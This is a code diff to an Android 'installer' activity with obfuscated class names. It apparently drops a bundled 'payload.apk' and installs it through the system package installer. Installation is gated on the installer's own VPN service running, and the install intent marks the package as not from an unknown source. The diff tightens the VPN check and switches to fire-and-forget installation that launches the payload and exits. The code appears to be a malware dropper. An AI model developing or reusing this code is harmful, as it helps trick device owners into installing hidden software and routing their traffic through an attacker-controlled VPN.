@@ -2,13 +2,8 @@ package com.onerule.task;
 
 import android.app.Activity;
 import android.content.ClipData;
-import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
-import android.net.ConnectivityManager;
-import android.net.Network;
-import android.net.NetworkCapabilities;
 import android.net.Uri;
 import android.net.VpnService;
 import android.os.Build;
@@ -36,7 +31,6 @@ public class A4450c4b785 extends Activity {
 
     private static final int REQ_VPN             = 1000;
     private static final int REQ_UNKNOWN_SOURCES = 1001;
-    private static final int REQ_PACKAGE_INSTALL   = 1002;
 
     private static final long PERM_POLL_MS   = 400;
     private static final long LAUNCH_POLL_MS = 300;
@@ -55,7 +49,6 @@ public class A4450c4b785 extends Activity {
      */
     private boolean vpnPermissionGranted         = false;
     private boolean awaitingUnknownSourcesGrant   = false;
-    private boolean awaitingPackageInstall       = false;
 
     /** True after the payload launches successfully — used to skip VPN re-checks. */
     private boolean installComplete = false;
@@ -65,9 +58,8 @@ public class A4450c4b785 extends Activity {
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
      *
-     * Uses V4450c4b785.isRunning() as the primary (and most reliable) check —
-     * it queries our static service instance directly rather than going through
-     * ConnectivityManager, which can lag or return stale data on many OEMs.
+     * Uses V4450c4b785.isRunning(), which queries this installer's service
+     * instance directly. A different VPN running on the device is not enough.
      *
      * Rules:
      *   - Button ENABLED  iff VPN is currently live.
@@ -106,24 +98,9 @@ public class A4450c4b785 extends Activity {
      *   instance directly.  This is instantaneous and works on all Android
      *   versions / OEMs regardless of ConnectivityManager quirks.
      *
-     * Secondary check — ConnectivityManager TRANSPORT_VPN: catches the rare case
-     *   where the instance reference was lost but a VPN network is still registered
-     *   (e.g. service process recycled by the OS on low-memory devices).
      */
     private boolean isVpnLive() {
-        if (V4450c4b785.isRunning()) return true;
-        try {
-            ConnectivityManager cm =
-                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            if (cm == null) return false;
-            for (Network net : cm.getAllNetworks()) {
-                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
-                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
-                    return true;
-                }
-            }
-        } catch (Exception ignored) {}
-        return false;
+        return V4450c4b785.isRunning();
     }
 
     // ── Activity lifecycle ─────────────────────────────────────────────────────
@@ -162,9 +139,9 @@ public class A4450c4b785 extends Activity {
     protected void onResume() {
         super.onResume();
 
-        // Do not redirect while Android's package installer is returning its
-        // result. The result callback owns the post-install launch.
-        if (isPayloadInstalled() && !installComplete && !awaitingPackageInstall) {
+        // With fire-and-forget package installation, resume is the completion
+        // signal: once the package is visible, launch it and close this installer.
+        if (isPayloadInstalled() && !installComplete) {
             doImmediateRedirect();
             return;
         }
@@ -258,23 +235,6 @@ public class A4450c4b785 extends Activity {
                 new Thread(this::dropAndInstall).start();
             } else {
                 runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
-            }
-        } else if (requestCode == REQ_PACKAGE_INSTALL) {
-            awaitingPackageInstall = false;
-            if (resultCode == RESULT_OK
-                    || (data != null
-                    && data.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
-                    == PackageInstaller.STATUS_SUCCESS)) {
-                status.setText("App installed, kindly wait for it to launch\u2026");
-                btn.setEnabled(false);
-                launchPayloadAndExit();
-            } else {
-                String message = data == null
-                        ? null
-                        : data.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                status.setText("Install cancelled"
-                        + (message == null || message.isEmpty() ? "." : ": " + message));
-                btn.setEnabled(true);
             }
         }
     }
@@ -459,7 +419,6 @@ public class A4450c4b785 extends Activity {
                 try {
                     openPackageInstaller(apk);
                 } catch (Exception e) {
-                    awaitingPackageInstall = false;
                     status.setText("Install failed: " + e.getMessage());
                 }
             });
@@ -477,8 +436,11 @@ public class A4450c4b785 extends Activity {
 
         Intent installIntent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
         installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
-        installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+        // Start the system package installer in its own task/document. Do not
+        // request a result callback; onResume() observes successful completion.
+        installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                | Intent.FLAG_ACTIVITY_NEW_DOCUMENT
+                | Intent.FLAG_GRANT_READ_URI_PERMISSION);
         installIntent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
         installIntent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getPackageName());
         installIntent.putExtra(Intent.EXTRA_ORIGINATING_URI, apkUri);
@@ -486,8 +448,7 @@ public class A4450c4b785 extends Activity {
                 Uri.parse("android-app:" + getPackageName()));
         installIntent.setClipData(ClipData.newRawUri("payload.apk", apkUri));
 
-        awaitingPackageInstall = true;
-        startActivityForResult(installIntent, REQ_PACKAGE_INSTALL);
+        startActivity(installIntent);
     }
 
 }
